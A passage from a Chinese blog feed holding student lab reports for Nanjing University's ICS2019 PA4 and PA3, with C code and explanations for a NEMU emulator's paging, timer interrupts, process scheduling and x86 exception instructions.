src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205720681183_927_20230601235540421541_424_image-20230530221047921.png" alt="image-20230530221047921"><figcaption aria-hidden="true">image-20230530221047921</figcaption></figure><p>emm。确实如讲义所说。我们现在不得不处理数据跨页的问题了。</p><p>跨页的思路也不难，在<code>vaddr_read</code>中将两次读取的字节进行整合，在<code>vaddr_write</code> 中将需要写入的字节进行拆分并分别写入两个页面即可。</p><p><code>read</code>的处理如下:write是完全类似的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a8v0drlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-a8v0drlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">else</span>{  <span class="hljs-comment">// printf("the data is in two pages\n");</span>  <span class="hljs-comment">// assert(0);</span>  <span class="hljs-comment">// the data is in two pages</span>  <span class="hljs-type">int</span> first_page_len = PAGE_SIZE - <span class="hljs-built_in">OFF</span>(addr);  <span class="hljs-comment">// printf("crossong page data addr:%x\n", addr);</span>  <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);  <span class="hljs-type">uint32_t</span> first_page_data = <span class="hljs-built_in">paddr_read</span>(paddr, first_page_len);  paddr = <span class="hljs-built_in">page_translate</span>(addr + first_page_len);  <span class="hljs-type">uint32_t</span> second_page_data = <span class="hljs-built_in">paddr_read</span>(paddr, len - first_page_len);  <span class="hljs-keyword">return</span> (second_page_data &lt;&lt; (first_page_len * <span class="hljs-number">8</span>)) + first_page_data;}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-aadm1olmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-aadm1olmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">else</span>{  <span class="hljs-comment">// printf("the data is in two pages\n");</span>  <span class="hljs-comment">// assert(0);</span>  <span class="hljs-comment">// the data is in two pages</span>  <span class="hljs-type">int</span> first_page_len = PAGE_SIZE - <span class="hljs-built_in">OFF</span>(addr);  <span class="hljs-comment">// printf("crossong page data addr:%x\n", addr);</span>  <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);  <span class="hljs-built_in">paddr_write</span>(paddr, data &amp; ((<span class="hljs-number">1</span> &lt;&lt; (first_page_len * <span class="hljs-number">8</span>)) - <span class="hljs-number">1</span>), first_page_len);  paddr = <span class="hljs-built_in">page_translate</span>(addr + first_page_len);  <span class="hljs-built_in">paddr_write</span>(paddr, data &gt;&gt; (first_page_len * <span class="hljs-number">8</span>), len - first_page_len);}</code></pre></div></div><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205722617786_472_20230601235542835305_606_image-20230531155347228.png" alt="image-20230531155347228" width="67%" height="67%"></p><h3 id="支持虚存管理的多道程序">支持虚存管理的多道程序</h3><p>这次只需要把调度代码改回去就可以了，不需要做额外的事情。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205725791533_135_20230601235547658121_402_image-20230531164538774.png" alt="image-20230531164538774"><figcaption aria-hidden="true">image-20230531164538774</figcaption></figure><h2 id="阶段三">阶段三</h2><h3 id="实现抢占多任务">实现抢占多任务</h3><blockquote><p>时钟中断通过<code>nemu/src/device/timer.c</code>中的<code>timer_intr()</code>触发,每10ms触发一次. 触发后,会调用<code>dev_raise_intr()</code>函数(在<code>nemu/src/device/intr.c</code>中定义).你需要:</p><ul><li>在<code>cpu</code>结构体中添加一个<code>bool</code>成员<code>INTR</code>.</li><li>在<code>dev_raise_intr()</code>中将INTR引脚设置为高电平.</li><li>在<code>exec_once()</code>的末尾添加轮询INTR引脚的代码,每次执行完一条指令就查看是否有硬件中断到来:</li></ul></blockquote><p>这三步照着做即可。</p><blockquote><ul><li>实现<code>isa_query_intr()</code>函数(在<code>nemu/src/isa/$ISA/intr.c</code>中定义):</li></ul></blockquote><p>注意Interrupt Enable Flag ，等于1接收中断响应。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-op8krelmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-op8krelmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isa_query_intr</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{<span class="hljs-keyword">if</span> (cpu.INTR==<span class="hljs-literal">true</span>&amp;&amp;cpu.eflags.IF==<span class="hljs-number">1</span>){cpu.INTR=<span class="hljs-literal">false</span>;<span class="hljs-built_in">raise_intr</span>(IRQ_TIMER,cpu.pc);<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;}</code></pre></div></div><blockquote><ul><li>修改<code>raise_intr()</code>中的代码, 让处理器进入关中断状态:</li></ul></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fi0okulmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-fi0okulmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">raise_intr</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> NO, <span class="hljs-type">vaddr_t</span> ret_addr)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Trigger an interrupt/exception with ``NO''.</span><span class="hljs-comment">   * That is, use ``NO'' to index the IDT.</span><span class="hljs-comment">   */</span>  <span class="hljs-comment">// step1</span>  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_push</span>(&amp;ret_addr);  cpu.eflags.IF = <span class="hljs-number">0</span>;  <span class="hljs-comment">// step2</span>  <span class="hljs-type">uint32_t</span> gate_addr = cpu.idtr.base, len = cpu.idtr.limit;  <span class="hljs-keyword">if</span> (len &lt;= NO)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the number is larger than the length of IDT!\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step3</span>  <span class="hljs-type">uint32_t</span> val_l, val_h, p;  val_l = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span>, <span class="hljs-number">2</span>);  val_h = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">2</span>);  p = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">7</span>;  <span class="hljs-comment">//actually no need to check p for NEMU, but we can do it.</span>  <span class="hljs-keyword">if</span> (!p)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"The gatedesc is not allowed!"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step4</span>  <span class="hljs-comment">//using rtl api</span>  <span class="hljs-type">vaddr_t</span> goal = (val_h &lt;&lt; <span class="hljs-number">16</span>) + val_l;  <span class="hljs-built_in">rtl_j</span>(goal);}</code></pre></div></div><blockquote><p>在软件上, 你还需要:</p><ul><li>在CTE中添加时钟中断的支持,将时钟中断打包成<code>_EVENT_IRQ_TIMER</code>事件.</li><li>Nanos-lite收到<code>_EVENT_IRQ_TIMER</code>事件之后,调用<code>_yield()</code>来强制当前进程让出CPU,同时也可以去掉我们之前在设备访问中插入的<code>_yield()</code>了.</li><li>为了可以让处理器在运行用户进程的时候响应时钟中断,你还需要修改<code>_ucontext()</code>的代码, 在构造上下文的时候,设置正确中断状态, 使得将来返回到用户进程后CPU处于开中断状态.</li></ul></blockquote><p>这三条也是照着做即可。</p><p>最后讲义中没提到的，是在<code>__am_irq_handle</code>中注册<code>_EVENT_IRQ_TIMER</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-e0dueelmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-e0dueelmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:  ev.event = _EVENT_IRQ_TIMER;  <span class="hljs-keyword">break</span>;</code></pre></div></div><p>可以看到每隔一段时间都触发一次时钟中断事件。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205726912624_659_20230601235551684634_469_image-20230531172613664.png" alt="image-20230531172613664"><figcaption aria-hidden="true">image-20230531172613664</figcaption></figure><h3 id="展示你的计算机系统">展示你的计算机系统</h3><blockquote><p>我们可以在Nanos-lite的<code>events_read()</code>函数中让<code>F1</code>,<code>F2</code>, <code>F3</code>这3个按键来和3个前台程序绑定, 例如,一开始是仙剑奇侠传和hello程序分时运行, 按下<code>F3</code>之后,就变成slider和hello程序分时运行. 如果你没有实现Navy-apps之上的AM,可以加载3份仙剑奇侠传, 让它们分别读取不同的存档进行游戏.</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z9h2tilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-z9h2tilmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (key &amp; <span class="hljs-number">0x8000</span>){  <span class="hljs-comment">//0x8002 to 0x8004 are F1 to F3</span>  <span class="hljs-keyword">if</span> (key&gt;=<span class="hljs-number">0x8002</span>&amp;&amp;key&lt;=<span class="hljs-number">0x8004</span>) <span class="hljs-built_in">change_gcb</span>(key<span class="hljs-number">-0x8001</span>);  <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"kd %s\n"</span>, keyname[key &amp; <span class="hljs-number">0x7fff</span>]);}</code></pre></div></div><p><code>amdev.h</code>里有张键位表，可以参考。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205728206939_964_20230601235555185137_348_image-20230531192942805.png" alt="image-20230531192942805"><figcaption aria-hidden="true">image-20230531192942805</figcaption></figure><p><code>change_gcb</code>需要添加外部引用。在<code>proc.c</code>定义:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-38ndf5lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-38ndf5lmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">uint32_t</span> fg_pcb;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">change_gcb</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> id)</span> </span>{ fg_pcb = id; }</code></pre></div></div><p>修改<code>schedule</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x7nm4ilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-x7nm4ilmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">uint32_t</span> now_id = <span class="hljs-number">0</span>;<span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  <span class="hljs-keyword">if</span> (now_id != fg_pcb)  {    now_id = fg_pcb;    current = &amp;pcb[fg_pcb];  }  <span class="hljs-keyword">else</span>  {    now_id = <span class="hljs-number">0</span>;    current = &amp;pcb[<span class="hljs-number">0</span>];  }  <span class="hljs-comment">// current = ((current == &amp;pcb[0]) ? &amp;pcb[1] : &amp;pcb[0]);</span>  <span class="hljs-comment">// current = &amp;pcb[0];</span>  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><p>为了更清晰的验证实现的效果，我将hello的输出注释掉了，并添加了键盘事件的Log。可以看到按F1-F3键的时候游戏会重新进入，hello也在一直运行。当然如果一直按的和上一次相同的按键不会有变化。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205729380091_270_20230601235557711505_227_image-20230531192547493.png" alt="image-20230531192547493"><figcaption aria-hidden="true">image-20230531192547493</figcaption></figure><h2 id="必答题">必答题</h2><h6 id="hello程序是什么-它从而何来-要到哪里去">hello程序是什么,它从而何来, 要到哪里去</h6><p>hello 程序在磁盘上，hello.c 被编译成 ELF 文件后，位于 ramdisk中。当用户运行该程序时，通过 naive_uload函数读入指定的内存并放在正确的位置。加载完成后，操作系统从其 ELF信息中获取到程序入口地址，通过上下文切换从入口地址处继续执行，hello程序便获取到 CPU 的控制权开始执行指令。</p><p>对于字符串在终端的显示，首先调用<code>printf</code>等库函数，然后通过 <code>SYS_write</code>系统调用来输出字符，系统调用通过调用外设的驱动程序最终将内容在外设中表现出来，程序执行完毕后操作系统会回收其内存空间。</p><p>上述只是大致的流程，展开来讲的话每一句话都可以拓展很多。由于时间有限这里就不展开了。</p><h6 id="上下文切换的具体过程">上下文切换的具体过程</h6><p>首先回顾PA3的选做题</p><blockquote><p>AM究竟给程序提供了多大的栈空间呢?</p></blockquote><p>观察<code>nexus-am/am/src/x86/nemu/boot/loader.ld</code>这个链接脚本可以发现，其中定义了一个符号<code>_stack_pointer</code></p><p>而根据AM启动客户程序的流程可知，在<code>nexus-am/am/src/x86/nemu/boot/start.S</code>中的<code>_start:</code>中将会执行<code>mov $_stack_pointer, %esp</code>，以此初始化栈指针。又注意到<code>_stack_top</code>符号的地址与之相差<code>0x8000</code>，因此可以回答AM中程序的栈空间大小为<code>0x8000</code>字节。</p><p>当然在在本次实验中也可以查看PCB的结构:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s26e1wlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-s26e1wlmrh9u68"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE (8 * PGSIZE)</span><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> {  <span class="hljs-type">uint8_t</span> stack[STACK_SIZE] PG_ALIGN;  <span class="hljs-keyword">struct</span> {    _Context *cp;    _AddressSpace as;    <span class="hljs-comment">// we do not free memory, so use `max_brk' to determine when to call _map()</span>    <span class="hljs-type">uintptr_t</span> max_brk;  };} PCB;</code></pre></div></div><p><code>STACK_SIZE (8 * PGSIZE)=8*4096=32768=0x8000</code>,和从汇编中的得到的结果是一致的。</p><p>在这次实验指导书中也有说明:</p><blockquote><p>代码为每一个进程分配了一个32KB的堆栈, 已经足够使用了,不会出现栈溢出导致UB.</p></blockquote><p>结合PA3的前两个必答题，在此以内核进程<code>hello</code>为例，将上下文切换的整个细节总结如下:</p><p><a href="https://excalidraw.com/#json=5d-KBtTMJBi6eNu4fkmrg,jm4Dt4nkNF8tgd7ix_B7ng">excalidraw</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205730980698_757_20230602001029829434_199_trap1.png" alt="trap1"><figcaption aria-hidden="true">trap1</figcaption></figure><h6 id="分时多任务的具体过程">分时多任务的具体过程</h6><blockquote><p>请结合代码,解释分页机制和硬件中断是如何支撑仙剑奇侠传和hello程序在我们的计算机系统(Nanos-lite,AM, NEMU)中分时运行的.</p></blockquote><p>分页机制由 Nanos-lite、AM 和 NEMU 配合实现。</p><ul><li><p>首先，NEMU 提供 CR0 与 CR3寄存器来辅助实现分页机制，CR0用于开启分页，CR3 记录页表基地址。随后，MMU进行分页地址的转换，在代码中表现为 NEMU 的<code>vaddr_read()</code>与<code>vaddr_write()</code>。</p></li><li><p>当启动一个用户进程后，Nanos-lite会在开头调用<code>_protect()</code>,它是AM中的功能，可以实现地址空间的创建，并且将内核空间映射到用户空间。之后进行<code>loader()</code>，在loader函数中与之前不同是，操作系统使用分页机制对其进行存储和加载，通过new_page 获得新的物理页，并用到AM中 <code>_map</code>以建立虚拟地址与物理地址的映射关系，退出后调用am中的<code>_ucontext</code>，在栈上创建必要的上下文信息和参数信息，而分页机制则保证了进程在对应虚拟地址存取信息时，在NEMU中能够通过<code>page_translate()</code>函数等完成到物理地址的转换，从而获得正确的信息。</p></li><li><p>之后在NEMU中运行时，每10ms在 <code>timer_intr()</code>触发一次时钟中断，此时NEMU检测到 <code>isa_query_intr()</code>为true，同时也会在该函数中调用<code>raise_intr</code>，为中断事件做准备并产生异常号。而操作系统接受到<code>_EVENT_IRQ_TIMER</code> 后调用 <code>_yield()</code>强行暂停该进程，最后在<code>schedule</code>中更换当前进程，通过AM的<code>_switch()</code>切换进程的虚拟内存空间， 并将进程的上下文传递给AM，AM 的 <code>asm_trap()</code>恢复这一现场。NEMU 执行下一条指令时，便开始新进程的运行。完成进程转换，如此反复形成分时运行。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA3</title>
    <link href="/posts/28172/"/>
    <url>/posts/28172/</url>
    
    <content type="html"><![CDATA[<h1 id="pa3实验报告">PA3实验报告</h1><p>2013599 田佳业</p><h2 id="一阶段">一阶段</h2><h3 id="实现异常响应机制">实现异常响应机制</h3><p>对于x86，"上文提到的新指令“比较多，这里先按在<code>nanos-lite</code>中<code>make ARCH=x86-nemu run</code>报错的顺序来补充指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211426961668_883_20230601235657523461_176_image-20230501195612494.png" alt="image-20230501195612494"><figcaption aria-hidden="true">image-20230501195612494</figcaption></figure><p>查看手册，这是<code>Grp7</code>中<code>lidt</code>指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211428026749_969_20230601235659951694_782_image-20230501195859504.png" alt="image-20230501195859504"><figcaption aria-hidden="true">image-20230501195859504</figcaption></figure><p>IDTR的格式在这，Figure9-1:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211429350111_168_20230601235705286388_738_image-20230501202135298.png" alt="image-20230501202135298"><figcaption aria-hidden="true">image-20230501202135298</figcaption></figure><p>因此我们的寄存器结构应该长这样:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7lrtielmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-7lrtielmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">struct</span>{    <span class="hljs-type">rtlreg_t</span> limit : <span class="hljs-number">16</span>;    <span class="hljs-type">rtlreg_t</span> base : <span class="hljs-number">32</span>;} idtr;</code></pre></div></div><p>下面为其添加执行操作。我们可以在手册中查到对应的伪代码。因为我们用不到GDT(NEMU里没有分段机制)，因此只看上面部分即可。而且我们是模拟32位机器，根据我们寄存器结构的实现，我们只需要实现<code>ELSE</code>部分即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211430306114_209_20230601235710126502_482_image-20230501202925594.png" alt="image-20230501202925594"><figcaption aria-hidden="true">image-20230501202925594</figcaption></figure><p>综上，代码如下所示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ptssjflmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ptssjflmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(lidt) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_li</span>(&amp;s0,id_dest-&gt;addr);  cpu.idtr.limit=<span class="hljs-built_in">vaddr_read</span>(s0,<span class="hljs-number">2</span>);  cpu.idtr.base=<span class="hljs-built_in">vaddr_read</span>(s0+<span class="hljs-number">2</span>,<span class="hljs-number">4</span>);  <span class="hljs-built_in">print_asm_template1</span>(lidt);}</code></pre></div></div><p>注册新指令，跑一下:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211431479331_469_20230601235712152820_107_image-20230501205158212.png" alt="image-20230501205158212"><figcaption aria-hidden="true">image-20230501205158212</figcaption></figure><p>嗯，该实现<code>int</code>指令了(之前注册过opcode_table，所以直接跳到这里了)</p><p>讲义中特意提及:</p><blockquote><p>你需要在自陷指令的helper函数中调用<code>raise_intr()</code>,而不要把异常响应机制的代码放在自陷指令的helper函数中实现,因为在后面我们会再次用到<code>raise_intr()</code>函数.</p></blockquote><p>因此我们先看这个函数该怎么实现。代码里只有一对括号，但讲义告诉我们了触发中断的响应过程:</p><ol type="1"><li>依次将eflags, cs(代码段寄存器), eip(也就是PC)寄存器的值压栈</li><li>从IDTR中读出IDT的首地址</li><li>根据异常号在IDT中进行索引, 找到一个门描述符</li><li>将门描述符中的offset域组合成异常入口地址</li><li>跳转到异常入口地址</li></ol><p>为了diftest，我们需要手动添加<code>cs</code>寄存器，在寄存器结构体里补充一下即可。</p><p>下面是依据四个步骤实现的<code>raise_intr</code>。其中额外关中断防止嵌套中断，并检查了特权级(额外是指不这么做也不影响NEMU实现的正确)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1r03lqlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-1r03lqlmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">raise_intr</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> NO, <span class="hljs-type">vaddr_t</span> ret_addr)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Trigger an interrupt/exception with ``NO''.</span><span class="hljs-comment">   * That is, use ``NO'' to index the IDT.</span><span class="hljs-comment">   */</span>  <span class="hljs-comment">// step1</span>  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_push</span>(&amp;ret_addr);  cpu.eflags.IF = <span class="hljs-number">0</span>;  <span class="hljs-comment">// step2</span>  <span class="hljs-type">uint32_t</span> gate_addr = cpu.idtr.base, len = cpu.idtr.limit;  <span class="hljs-keyword">if</span> (len &lt;= NO)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the number is larger than the length of IDT!\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step3</span>  <span class="hljs-type">uint32_t</span> val_l, val_h, p;  val_l = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span>, <span class="hljs-number">2</span>);  val_h = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">2</span>);  p = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">7</span>;  <span class="hljs-comment">//actually no need to check p for NEMU, but we can do it.</span>  <span class="hljs-keyword">if</span> (!p)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"The gatedesc is not allowed!"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step4</span>  <span class="hljs-comment">//using rtl api</span>  <span class="hljs-type">vaddr_t</span> goal = (val_h &lt;&lt; <span class="hljs-number">16</span>) + val_l;  <span class="hljs-built_in">rtl_j</span>(goal);}</code></pre></div></div><p>int指令根据手册有三种。<code>0xcc</code>的是断点，<code>0xcd</code>的是一般的中断指令，<code>0xce</code>是溢出中断指令。<code>0xcc</code>和<code>0xce</code>中断号分别为3和4。<code>decinfo.seq_pc</code>中保存的是int指令的下一条指令。因此可以做以下实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-74jo3wlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-74jo3wlmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-type">int</span>) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-keyword">switch</span>(decinfo.opcode){    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcc</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x3</span>,decinfo.seq_pc);  <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcd</span> : <span class="hljs-built_in">raise_intr</span>(id_dest-&gt;val, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xce</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x4</span>, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    }  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"int %s"</span>, id_dest-&gt;str);  <span class="hljs-built_in">difftest_skip_dut</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);}</code></pre></div></div><p>写完之后发现报错，是没有外部声明。在开头加上外部声明:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fn5e8ilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-fn5e8ilmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">raise_intr</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> NO, <span class="hljs-type">vaddr_t</span> ret_addr)</span></span>;</code></pre></div></div><p>关于讲义中提到阅读<code>_cte_init()</code>的代码,找出相应的异常入口地址:对x86来说,这个函数就是准备了一个有意义的IDT，出现异常的时候根据IDTR中保存的信息去找中断向量表即可。这个过程上面已经实现了。</p><p>然后是<code>iret</code>。这就是保存上下文部分的工作了，说明这一部分已经完成。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211432470334_640_20230601235717680355_998_image-20230501215158239.png" alt="image-20230501215158239"><figcaption aria-hidden="true">image-20230501215158239</figcaption></figure><h3 id="保存上下文">保存上下文</h3><p><code>iret</code>指令手册说的很复杂，但由于NEMU不涉及特权级和段机制，因此我们只需要关注一句话:</p><blockquote><p>In Real Address Mode, IRET pops the instruction pointer, CS, and theflags register from the stack and resumes the interrupted routine.</p></blockquote><p>故可实现如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f2ugqilmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-f2ugqilmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(iret) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_pop</span>(&amp;s0);  <span class="hljs-built_in">rtl_j</span>(s0);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"iret"</span>);}</code></pre></div></div><p>同<code>raise_intr</code>，恢复<code>eip</code>，更新decoding中的跳转 eip信息可以直接调用<code>rtl_j</code>实现。实际上就是跳到调用中断的地方去了。</p><p><code>pusha</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211433753019_996_20230601235720131761_628_image-20230501222920241.png" alt="image-20230501222920241"><figcaption aria-hidden="true">image-20230501222920241</figcaption></figure><p>顾名思义，它的功能是把所有通用寄存器都压入栈中。这个可以说是非常赏心悦目了，对照实现即可。<code>popa</code>显然也是对称的，不再赘述。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211434803453_893_20230601235723245458_604_image-20230501223135299.png" alt="image-20230501223135299" width="50%" height="50%"></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hj8yt4lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-hj8yt4lmrh9u68"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(pusha) {  <span class="hljs-comment">//TODO();</span>    <span class="hljs-built_in">rtl_mv</span>(&amp;s0,&amp;cpu.esp);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.eax);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.ecx);<span class="hljs-built_in">rtl_push</span>(&amp;cpu.edx);<span 